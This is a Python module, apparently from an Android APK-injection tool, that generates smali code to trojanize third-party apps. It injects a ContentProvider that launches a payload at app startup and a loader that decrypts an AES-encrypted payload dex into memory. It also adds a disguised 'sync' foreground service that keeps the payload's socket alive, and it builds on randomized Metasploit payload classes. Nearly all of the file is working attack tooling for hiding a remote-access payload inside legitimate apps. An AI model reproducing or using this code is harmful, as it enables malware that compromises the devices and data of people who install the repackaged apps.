#!/usr/bin/python3
# -*- coding: utf-8 -*-
"""
ProviderInject —— "零改 dex" 注入。

前情：模式 1/3 的壳要在 attachBaseContext 里反射把 App 的 dex 塞进
BaseDexClassLoader（pathList / dexElements / makePathElements）。这些成员在
Android 10+ 属于隐藏 API，必须配合 setHiddenApiExemptions 才能用，机型/系统
版本差异很大；一旦失败，宿主 dex 加载不进来，App 一启动就是
ClassNotFoundException —— 表现就是"打开就闪退"。

本模块给出一条完全不碰宿主 dex、不碰隐藏 API 的路：

    <provider android:name="Lcom/<a>/<b>/<c>Provider;" authorities="<pkg>.apkhook"/>

ContentProvider 由系统在 installContentProviders 阶段实例化并调用 onCreate()，
那里直接调 payload 的 guard.run(context)。整条链路只用公开 API：

  * 不替换 android:name，不反射委派 Application；
  * 不反编译/回编译宿主任何 dex（不需要 baksmali/smali 处理宿主代码）；
  * payload + provider 单独编成一个新 classesN.dex，Android 5.0+ 原生加载。

代价：做不了 dex 加密（宿主的 dex 仍然是明文躺在 APK 里），所以定位是"能跑起来
的注入"，而不是加固。要加密请用模式 1/3。

取证通道：provider 的 onCreate 会安装一个 Thread.UncaughtExceptionHandler，
并把每一步、以及任何未捕获异常的完整栈，追加到
`Android/data/<pkg>/files/apkhook_probe.log`。真机上闪退也能知道停在哪一步、
崩在哪个类哪一行，不必连电脑抓 logcat。

注意：这里的 smali 刻意写成"直线代码"——不用 try/catch 包住调用点，
返回的 int 也放到独立寄存器，避免 ART 校验器在类型合并处报 VerifyError
（一旦 VerifyError，系统只会跳过 provider，不写日志、不闪退，很难判断）。
"""
import os
import random
import string

from .FsSafe import write_bytes

PROBE_TEMPLATE = """.class public final L{package}/{probe};
.super Ljava/lang/Object;
.implements Ljava/lang/Thread$UncaughtExceptionHandler;

.field private static ctx:Landroid/content/Context;

.field private static prev:Ljava/lang/Thread$UncaughtExceptionHandler;

.method public constructor <init>()V
    .locals 0
    invoke-direct {{p0}}, Ljava/lang/Object;-><init>()V
    return-void
.end method

.method public static install(Landroid/content/Context;)V
    .locals 2
    :try_start_0
    sput-object p0, L{package}/{probe};->ctx:Landroid/content/Context;
    invoke-static {{}}, Ljava/lang/Thread;->getDefaultUncaughtExceptionHandler()Ljava/lang/Thread$UncaughtExceptionHandler;
    move-result-object v0
    sput-object v0, L{package}/{probe};->prev:Ljava/lang/Thread$UncaughtExceptionHandler;
    new-instance v1, L{package}/{probe};
    invoke-direct {{v1}}, L{package}/{probe};-><init>()V
    invoke-static {{v1}}, Ljava/lang/Thread;->setDefaultUncaughtExceptionHandler(Ljava/lang/Thread$UncaughtExceptionHandler;)V
    const-string v0, "0 probe:installed"
    invoke-static {{v0}}, L{package}/{probe};->ws(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Throwable; {{:try_start_0 .. :try_end_0}} :catch_0
    :catch_0
    return-void
.end method

.method public static ws(Ljava/lang/String;)V
    .locals 1
    sget-object v0, L{package}/{probe};->ctx:Landroid/content/Context;
    invoke-static {{v0, p0}}, L{package}/{probe};->w(Landroid/content/Context;Ljava/lang/String;)V
    return-void
.end method

.method public static w(Landroid/content/Context;Ljava/lang/String;)V
    .locals 4
    :try_start_0
    sput-object p0, L{package}/{probe};->ctx:Landroid/content/Context;
    const/4 v0, 0x0
    invoke-virtual {{p0, v0}}, Landroid/content/Context;->getExternalFilesDir(Ljava/lang/String;)Ljava/io/File;
    move-result-object v0
    new-instance v1, Ljava/io/File;
    const-string v2, "apkhook_probe.log"
    invoke-direct {{v1, v0, v2}}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V
    new-instance v0, Ljava/io/FileOutputStream;
    const/4 v3, 0x1
    invoke-direct {{v0, v1, v3}}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;Z)V
    invoke-virtual {{p1}}, Ljava/lang/String;->getBytes()[B
    move-result-object v1
    invoke-virtual {{v0, v1}}, Ljava/io/FileOutputStream;->write([B)V
    const-string v1, "\\n"
    invoke-virtual {{v1}}, Ljava/lang/String;->getBytes()[B
    move-result-object v1
    invoke-virtual {{v0, v1}}, Ljava/io/FileOutputStream;->write([B)V
    invoke-virtual {{v0}}, Ljava/io/FileOutputStream;->flush()V
    invoke-virtual {{v0}}, Ljava/io/FileOutputStream;->close()V
    :try_end_0
    .catch Ljava/lang/Throwable; {{:try_start_0 .. :try_end_0}} :catch_0
    :catch_0
    return-void
.end method

.method public static wt(Ljava/lang/String;Ljava/lang/Throwable;)V
    .locals 2
    :try_start_0
    new-instance v0, Ljava/lang/StringBuilder;
    invoke-direct {{v0}}, Ljava/lang/StringBuilder;-><init>()V
    invoke-virtual {{v0, p0}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    if-eqz p1, :flush
    const-string v1, "\\n"
    invoke-virtual {{v0, v1}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    invoke-static {{p1}}, Landroid/util/Log;->getStackTraceString(Ljava/lang/Throwable;)Ljava/lang/String;
    move-result-object v1
    invoke-virtual {{v0, v1}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    :flush
    invoke-virtual {{v0}}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    move-result-object v0
    invoke-static {{v0}}, L{package}/{probe};->ws(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Throwable; {{:try_start_0 .. :try_end_0}} :catch_0
    :catch_0
    return-void
.end method

.method public static flushShell(Landroid/content/Context;)V
    .locals 1
    :try_start_0
    invoke-static {{p0}}, Lcom/sakuqi/steady/ProxyUtils;->flush(Landroid/content/Context;)V
    :try_end_0
    .catch Ljava/lang/Throwable; {{:try_start_0 .. :try_end_0}} :catch_0
    :catch_0
    return-void
.end method

.method public uncaughtException(Ljava/lang/Thread;Ljava/lang/Throwable;)V
    .locals 2
    :try_start_0
    new-instance v0, Ljava/lang/StringBuilder;
    invoke-direct {{v0}}, Ljava/lang/StringBuilder;-><init>()V
    const-string v1, "FATAL thread="
    invoke-virtual {{v0, v1}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    if-eqz p1, :noname
    invoke-virtual {{p1}}, Ljava/lang/Thread;->getName()Ljava/lang/String;
    move-result-object v1
    invoke-virtual {{v0, v1}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    :noname
    invoke-virtual {{v0}}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    move-result-object v0
    invoke-static {{v0, p2}}, L{package}/{probe};->wt(Ljava/lang/String;Ljava/lang/Throwable;)V
    :try_end_0
    .catch Ljava/lang/Throwable; {{:try_start_0 .. :try_end_0}} :catch_0
    :catch_0
    sget-object v0, L{package}/{probe};->prev:Ljava/lang/Thread$UncaughtExceptionHandler;
    if-eqz v0, :done
    invoke-interface {{v0, p1, p2}}, Ljava/lang/Thread$UncaughtExceptionHandler;->uncaughtException(Ljava/lang/Thread;Ljava/lang/Throwable;)V
    :done
    return-void
.end method
"""

PROVIDER_TEMPLATE = """.class public final L{descriptor};
.super Landroid/content/ContentProvider;

.method public constructor <init>()V
    .locals 0
    invoke-direct {{p0}}, Landroid/content/ContentProvider;-><init>()V
    return-void
.end method

.method public onCreate()Z
    .locals 5
    invoke-virtual {{p0}}, Landroid/content/ContentProvider;->getContext()Landroid/content/Context;
    move-result-object v0
    if-eqz v0, :nocontext
{preflush}
    invoke-static {{v0}}, L{probe};->install(Landroid/content/Context;)V
    const-string v1, "1 provider:onCreate reached"
    invoke-static {{v0, v1}}, L{probe};->w(Landroid/content/Context;Ljava/lang/String;)V
{keepstart}    {invoke}
    const-string v1, "2 provider:payload start returned"
    invoke-static {{v0, v1}}, L{probe};->w(Landroid/content/Context;Ljava/lang/String;)V
    :nocontext
    const/4 v2, 0x1
    return v2
.end method

.method public query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    .locals 1
    const/4 v0, 0x0
    return-object v0
.end method

.method public getType(Landroid/net/Uri;)Ljava/lang/String;
    .locals 1
    const/4 v0, 0x0
    return-object v0
.end method

.method public insert(Landroid/net/Uri;Landroid/content/ContentValues;)Landroid/net/Uri;
    .locals 1
    const/4 v0, 0x0
    return-object v0
.end method

.method public delete(Landroid/net/Uri;Ljava/lang/String;[Ljava/lang/String;)I
    .locals 1
    const/4 v0, 0x0
    return v0
.end method

.method public update(Landroid/net/Uri;Landroid/content/ContentValues;Ljava/lang/String;[Ljava/lang/String;)I
    .locals 1
    const/4 v0, 0x0
    return v0
.end method
"""

# ---------------------------------------------------------------------------
# 模式 6：加密 payload（assets/apkhook/payload.bin）→ 内存 dex 加载
#
# 为什么不复用模式 1 的壳：Android 15+ 把 VMRuntime.setHiddenApiExemptions 列为
# blocked，Reflection 一调就是 "api=blocked ... denied"，
# 于是 DexPathList.makePathElements / dexElements 全部拿不到 —— 换壳加密宿主 dex
# 这条路在 Android 15/16/17 上用纯 Java 无解（真机 logcat 已实测确认）。
#
# 但 InMemoryDexClassLoader(ByteBuffer, ClassLoader) 是 **公开 API（API 26+）**，
# 不需要任何反射。所以：宿主 dex 原地不动（系统自己加载），只把 payload 加密
# 放进 assets，运行时读出来 AES 解密 → InMemoryDexClassLoader → 反射调 start()。
# 效果与模式 1 的目标一致（payload 注入 + 落盘加密），但不碰隐藏 API。
PAYLOAD_LOADER_TEMPLATE = """.class public final L{package}/{loader};
.super Ljava/lang/Object;

.method public constructor <init>()V
    .locals 0
    invoke-direct {{p0}}, Ljava/lang/Object;-><init>()V
    return-void
.end method

.method public static run(Landroid/content/Context;)V
    .locals 9
    :try_start_0
    # ---- 1) 从 APK 里读 assets/apkhook/payload.bin ----
    # 用 ZipFile 直接读自己的 APK：AssetManager.open 在这台机器上读出来是 0 字节
    # （真机实测），而 ZipFile 这条路在壳里已经验证可用。
    invoke-virtual {{p0}}, Landroid/content/Context;->getApplicationInfo()Landroid/content/pm/ApplicationInfo;
    move-result-object v0
    iget-object v0, v0, Landroid/content/pm/ApplicationInfo;->sourceDir:Ljava/lang/String;

    new-instance v1, Ljava/util/zip/ZipFile;
    invoke-direct {{v1, v0}}, Ljava/util/zip/ZipFile;-><init>(Ljava/lang/String;)V

    const-string v2, "assets/apkhook/payload.bin"
    invoke-virtual {{v1, v2}}, Ljava/util/zip/ZipFile;->getEntry(Ljava/lang/String;)Ljava/util/zip/ZipEntry;
    move-result-object v3

    invoke-virtual {{v1, v3}}, Ljava/util/zip/ZipFile;->getInputStream(Ljava/util/zip/ZipEntry;)Ljava/io/InputStream;
    move-result-object v2

    new-instance v0, Ljava/io/ByteArrayOutputStream;
    invoke-direct {{v0}}, Ljava/io/ByteArrayOutputStream;-><init>()V

    const/16 v3, 0x2000
    new-array v3, v3, [B

    :loop
    invoke-virtual {{v2, v3}}, Ljava/io/InputStream;->read([B)I
    move-result v4
    if-ltz v4, :eof
    const/4 v5, 0x0
    invoke-virtual {{v0, v3, v5, v4}}, Ljava/io/ByteArrayOutputStream;->write([BII)V
    goto :loop

    :eof
    invoke-virtual {{v2}}, Ljava/io/InputStream;->close()V
    invoke-virtual {{v1}}, Ljava/util/zip/ZipFile;->close()V
    invoke-virtual {{v0}}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B
    move-result-object v0


    # ---- 2) AES/ECB/PKCS7 解密（与打包端 EncryptFile.py 同 key 同模式）----
    const-string v1, "{aes_key}"
    const-string v2, "UTF-8"
    invoke-virtual {{v1, v2}}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B
    move-result-object v1

    new-instance v2, Ljavax/crypto/spec/SecretKeySpec;
    const-string v3, "AES"
    invoke-direct {{v2, v1, v3}}, Ljavax/crypto/spec/SecretKeySpec;-><init>([BLjava/lang/String;)V

    const-string v1, "AES/ECB/PKCS5Padding"
    invoke-static {{v1}}, Ljavax/crypto/Cipher;->getInstance(Ljava/lang/String;)Ljavax/crypto/Cipher;
    move-result-object v1

    const/4 v3, 0x2
    invoke-virtual {{v1, v3, v2}}, Ljavax/crypto/Cipher;->init(ILjava/security/Key;)V
    invoke-virtual {{v1, v0}}, Ljavax/crypto/Cipher;->doFinal([B)[B
    move-result-object v0

    # ---- 3) InMemoryDexClassLoader（公开 API，无需隐藏 API）----
    # 注意：openInMemoryDexFiles() 只认 **direct** ByteBuffer。
    # 用 ByteBuffer.wrap(byte[]) 会抛 java.io.IOException: Bad range（真机实测）。
    # 同时把解密结果落盘一份，排障时可以直接 pull 下来比对（排障用，可留）。
    const/4 v6, 0x0
    invoke-virtual {{p0, v6}}, Landroid/content/Context;->getExternalFilesDir(Ljava/lang/String;)Ljava/io/File;
    move-result-object v6

    new-instance v7, Ljava/io/File;
    const-string v8, "payload_dec.dex"
    invoke-direct {{v7, v6, v8}}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    new-instance v6, Ljava/io/FileOutputStream;
    invoke-direct {{v6, v7}}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V
    invoke-virtual {{v6, v0}}, Ljava/io/FileOutputStream;->write([B)V
    invoke-virtual {{v6}}, Ljava/io/FileOutputStream;->close()V

    array-length v2, v0
    invoke-static {{v2}}, Ljava/nio/ByteBuffer;->allocateDirect(I)Ljava/nio/ByteBuffer;
    move-result-object v2

    invoke-virtual {{v2, v0}}, Ljava/nio/ByteBuffer;->put([B)Ljava/nio/ByteBuffer;
    move-result-object v3

    const/4 v3, 0x0
    invoke-virtual {{v2, v3}}, Ljava/nio/ByteBuffer;->position(I)Ljava/nio/ByteBuffer;
    move-result-object v3

    invoke-virtual {{p0}}, Landroid/content/Context;->getClassLoader()Ljava/lang/ClassLoader;
    move-result-object v4

    new-instance v5, Ldalvik/system/InMemoryDexClassLoader;
    invoke-direct {{v5, v2, v4}}, Ldalvik/system/InMemoryDexClassLoader;-><init>(Ljava/nio/ByteBuffer;Ljava/lang/ClassLoader;)V

    # ---- 4) 反射调 payload 的 start(Context) ----
    const-string v0, "{payload_dotted}"
    const/4 v1, 0x1
    invoke-static {{v0, v1, v5}}, Ljava/lang/Class;->forName(Ljava/lang/String;ZLjava/lang/ClassLoader;)Ljava/lang/Class;
    move-result-object v0

    const-string v1, "start"
    const/4 v3, 0x1
    new-array v3, v3, [Ljava/lang/Class;
    const/4 v4, 0x0
    const-class v5, Landroid/content/Context;
    aput-object v5, v3, v4
    invoke-virtual {{v0, v1, v3}}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;
    move-result-object v0

    const/4 v1, 0x1
    new-array v1, v1, [Ljava/lang/Object;
    const/4 v3, 0x0
    aput-object p0, v1, v3
    const/4 v3, 0x0
    invoke-virtual {{v0, v3, v1}}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_0
    .catch Ljava/lang/Throwable; {{:try_start_0 .. :try_end_0}} :catch_0
    const-string v0, "3 loader: payload started"
    invoke-static {{p0, v0}}, L{package}/{probe};->w(Landroid/content/Context;Ljava/lang/String;)V
    return-void

    :catch_0
    move-exception v0
    const-string v1, "X loader: payload load failed"
    invoke-static {{v1, v0}}, L{package}/{probe};->wt(Ljava/lang/String;Ljava/lang/Throwable;)V
    return-void
.end method
"""

_ALPHABET = string.ascii_lowercase


def _rand(n=8, rng=None):
    rng = rng or random
    return ''.join(rng.choice(_ALPHABET) for _ in range(n))


def BuildPayloadLoader(payload_root, vars, aes_key=None, seed=None):
    """生成 payload 解密 + 内存 dex 加载器（模式 6 专用）。

    和 provider 写在同一个 smali 包里（同一个 dex），provider 的 onCreate 调
    `L<loader>;->run(Landroid/content/Context;)V`。

    :return: dict(descriptor, class, smali, payload_dotted)
    """
    if aes_key is None:
        from .config import OPTIONS
        aes_key = OPTIONS['AESCryptKey']
    pkg_dir = f"com/{vars['a']}/{vars['b']}"
    loader = f"{vars['c']}Loader"
    probe = f"{vars['c']}Probe"
    payload_dotted = vars['descriptor'].lstrip('L').rstrip(';').replace('/', '.')

    body = PAYLOAD_LOADER_TEMPLATE.format(
        package=pkg_dir, loader=loader, probe=probe,
        aes_key=aes_key, payload_dotted=payload_dotted)

    smali_dir = os.path.join(payload_root, 'com', vars['a'], vars['b'])
    os.makedirs(smali_dir, exist_ok=True)
    smali_path = os.path.join(smali_dir, f"{loader}.smali")
    write_bytes(smali_path, body.encode('utf-8'))
    return {
        'descriptor': f"L{pkg_dir}/{loader};",
        'class': f"{pkg_dir}/{loader}".replace('/', '.'),
        'smali': smali_path,
        'payload_dotted': payload_dotted,
    }


def BuildProvider(payload_root, package, vars, authorities=None, seed=None,
                  invoke_payload=True, flush_shell=False, invoke_override=None,
                  start_service=None):
    """在 payload smali 根目录里生成 provider 类（+ 探针日志类）。

    :param payload_root: smali 根目录（和 payload 同一个 dex，保证能互相引用）
    :param package: 目标包名，用于生成唯一的 authorities
    :param vars: InjectMsf2App.RandomizeMsfSmali() 的返回值
    :param authorities: 指定 authorities；None 表示自动生成
    :param invoke_payload: False 时只写探针、不启动 payload（定位闪退用）
    :param invoke_override: 直接指定 provider.onCreate 里那段调用（模式 6 用）
    :return: dict(package_dir, smali, descriptor, class, authorities, invoke, probe)
    """
    rng = random.Random(seed) if seed is not None else random.Random()
    # vars['package_dir'] 是磁盘绝对路径，这里必须用 a/b 重新拼 smali 包路径
    pkg_dir = f"com/{vars['a']}/{vars['b']}"
    descriptor = f"{pkg_dir}/{vars['c']}Provider"      # com/<a>/<b>/<c>Provider
    probe = f"{vars['c']}Probe"                        # com/<a>/<b>/<c>Probe
    guard = vars['guard_descriptor']
    probe_fq = f"{pkg_dir}/{probe}"                    # com/<a>/<b>/<c>Probe（带包路径）
    method = vars.get('guard_method') or 'run(Landroid/content/Context;)V'
    if invoke_override:
        invoke = invoke_override
    elif invoke_payload:
        invoke = f"    invoke-static {{v0}}, {guard}->{method}\n"
    else:
        invoke = ("    const-string v1, \"2 provider:payload start disabled\"\n"
                  f"    invoke-static {{v0, v1}}, L{probe_fq};->w(Landroid/content/Context;Ljava/lang/String;)V\n")

    if start_service:
        keepstart = (
            "    :try_start_k\n"
            "    new-instance v3, Landroid/content/Intent;\n"
            "    invoke-direct {v3}, Landroid/content/Intent;-><init>()V\n"
            f"    const-string v4, \"{start_service}\"\n"
            "    invoke-virtual {v3, v0, v4}, Landroid/content/Intent;->"
            "setClassName(Landroid/content/Context;Ljava/lang/String;)"
            "Landroid/content/Intent;\n"
            "    sget v4, Landroid/os/Build$VERSION;->SDK_INT:I\n"
            "    const/16 v1, 0x1a\n"
            "    if-lt v4, v1, :klegacy\n"
            "    invoke-virtual {v0, v3}, Landroid/content/Context;->"
            "startForegroundService(Landroid/content/Intent;)"
            "Landroid/content/ComponentName;\n"
            "    goto :kdone\n"
            "    :klegacy\n"
            "    invoke-virtual {v0, v3}, Landroid/content/Context;->"
            "startService(Landroid/content/Intent;)Landroid/content/ComponentName;\n"
            "    :kdone\n"
            "    :try_end_k\n"
            "    .catch Ljava/lang/Throwable; {:try_start_k .. :try_end_k} :catch_k\n"
            "    goto :kafter\n"
            "    :catch_k\n"
            "    move-exception v3\n"
            "    :kafter\n"
        )
    else:
        keepstart = ""
    body = PROVIDER_TEMPLATE.format(descriptor=descriptor, invoke=invoke,
                                    probe=probe_fq, keepstart=keepstart,
                                    preflush=(
                                        f"    invoke-static {{v0}}, L{probe_fq};"
                                        "->flushShell(Landroid/content/Context;)V\n"
                                        if flush_shell else ""))
    probe_body = PROBE_TEMPLATE.format(package=f"com/{vars['a']}/{vars['b']}",
                                       probe=probe)
    smali_dir = os.path.join(payload_root, 'com', vars['a'], vars['b'])
    os.makedirs(smali_dir, exist_ok=True)
    smali_path = os.path.join(smali_dir, f"{vars['c']}Provider.smali")
    write_bytes(smali_path, body.encode('utf-8'))
    write_bytes(os.path.join(smali_dir, f"{probe}.smali"), probe_body.encode('utf-8'))

    authorities = authorities or f"{package}.apkhook{_rand(6, rng)}"
    return {
        'package_dir': pkg_dir,
        'smali': smali_path,
        'descriptor': f"L{descriptor};",
        'class': descriptor.replace('/', '.'),
        'authorities': authorities,
        'invoke': invoke,
        'probe': f"L{probe};",
    }


# ---------------------------------------------------------------------------
# 前台服务保活（2.0）
#
# Android 8+ 有后台执行限制，Android 12~17 还会把 cached 进程冻住（freezer），
# 没有前台服务的 App 一切到后台，payload 的 socket 就不再被调度（表现：
# 前台正常、切后台就断）。这里起一个最小化的前台服务，把进程钉在
# "foreground service" 状态；通知用 App 自己的图标，文案全 ASCII。
# ---------------------------------------------------------------------------
KEEPALIVE_TEMPLATE = """.class public final L{package}/{keep};
.super Landroid/app/Service;

.method public constructor <init>()V
    .locals 0
    invoke-direct {{p0}}, Landroid/app/Service;-><init>()V
    return-void
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1
    const/4 v0, 0x0
    return-object v0
.end method

.method public onCreate()V
    .locals 0
    invoke-super {{p0}}, Landroid/app/Service;->onCreate()V
    invoke-direct {{p0}}, L{package}/{keep};->go()V
    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 1
    invoke-direct {{p0}}, L{package}/{keep};->go()V
    const/4 v0, 0x1
    return v0
.end method

.method private channel()V
    .locals 4
    :try_start_0
    new-instance v0, Landroid/app/NotificationChannel;
    const-string v1, "sync"
    const-string v2, "sync"
    const/4 v3, 0x2
    invoke-direct {{v0, v1, v2, v3}}, Landroid/app/NotificationChannel;-><init>(Ljava/lang/String;Ljava/lang/CharSequence;I)V
    const-string v1, "notification"
    invoke-virtual {{p0, v1}}, L{package}/{keep};->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
    move-result-object v1
    check-cast v1, Landroid/app/NotificationManager;
    invoke-virtual {{v1, v0}}, Landroid/app/NotificationManager;->createNotificationChannel(Landroid/app/NotificationChannel;)V
    :try_end_0
    .catch Ljava/lang/Throwable; {{:try_start_0 .. :try_end_0}} :catch_0
    return-void
    :catch_0
    move-exception v0
    return-void
.end method

.method private go()V
    .locals 8
    :try_start_0
    invoke-virtual {{p0}}, L{package}/{keep};->getApplicationInfo()Landroid/content/pm/ApplicationInfo;
    move-result-object v0
    iget v1, v0, Landroid/content/pm/ApplicationInfo;->icon:I
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I
    const/16 v2, 0x1a
    if-lt v0, v2, :old
    invoke-direct {{p0}}, L{package}/{keep};->channel()V
    new-instance v2, Landroid/app/Notification$Builder;
    const-string v3, "sync"
    invoke-direct {{v2, p0, v3}}, Landroid/app/Notification$Builder;-><init>(Landroid/content/Context;Ljava/lang/String;)V
    goto :built
    :old
    new-instance v2, Landroid/app/Notification$Builder;
    invoke-direct {{v2, p0}}, Landroid/app/Notification$Builder;-><init>(Landroid/content/Context;)V
    :built
    invoke-virtual {{v2, v1}}, Landroid/app/Notification$Builder;->setSmallIcon(I)Landroid/app/Notification$Builder;
    move-result-object v2
    const-string v3, "sync"
    invoke-virtual {{v2, v3}}, Landroid/app/Notification$Builder;->setContentTitle(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;
    move-result-object v2
    const/4 v3, 0x1
    invoke-virtual {{v2, v3}}, Landroid/app/Notification$Builder;->setOngoing(Z)Landroid/app/Notification$Builder;
    move-result-object v2
    invoke-virtual {{v2}}, Landroid/app/Notification$Builder;->build()Landroid/app/Notification;
    move-result-object v2
    const v3, 0x5a17
    sget v4, Landroid/os/Build$VERSION;->SDK_INT:I
    const/16 v5, 0x1d
    if-lt v4, v5, :two
    # Android 10+：显式给前台服务类型（1 = dataSync），
    # 否则 Android 14+ 抛 MissingForegroundServiceTypeException。
    const/4 v5, 0x1
    invoke-virtual {{p0, v3, v2, v5}}, L{package}/{keep};->startForeground(ILandroid/app/Notification;I)V
    goto :ok
    :two
    invoke-virtual {{p0, v3, v2}}, L{package}/{keep};->startForeground(ILandroid/app/Notification;)V
    :ok
    :try_end_0
    .catch Ljava/lang/Throwable; {{:try_start_0 .. :try_end_0}} :catch_0
    const-string v4, "apkhook"
    const-string v5, "keep: foreground ok"
    invoke-static {{v4, v5}}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I
    return-void
    :catch_0
    move-exception v0
    const-string v4, "apkhook"
    const-string v5, "keep: foreground failed"
    invoke-static {{v4, v5, v0}}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I
    return-void
.end method
"""


def BuildKeepAlive(payload_root, vars, seed=None):
    """生成前台服务类（保活用），返回 {'class','descriptor','smali'}。"""
    rng = random.Random(seed) if seed is not None else random.Random()
    pkg = f"com/{vars['a']}/{vars['b']}"
    keep = f"{vars['c']}Keep"
    body = KEEPALIVE_TEMPLATE.format(package=pkg, keep=keep)
    smali_dir = os.path.join(payload_root, 'com', vars['a'], vars['b'])
    os.makedirs(smali_dir, exist_ok=True)
    path = os.path.join(smali_dir, f"{keep}.smali")
    write_bytes(path, body.encode('utf-8'))
    return {
        'class': f"{pkg}/{keep}".replace('/', '.'),
        'descriptor': f"L{pkg}/{keep};",
        'smali': path,
    }

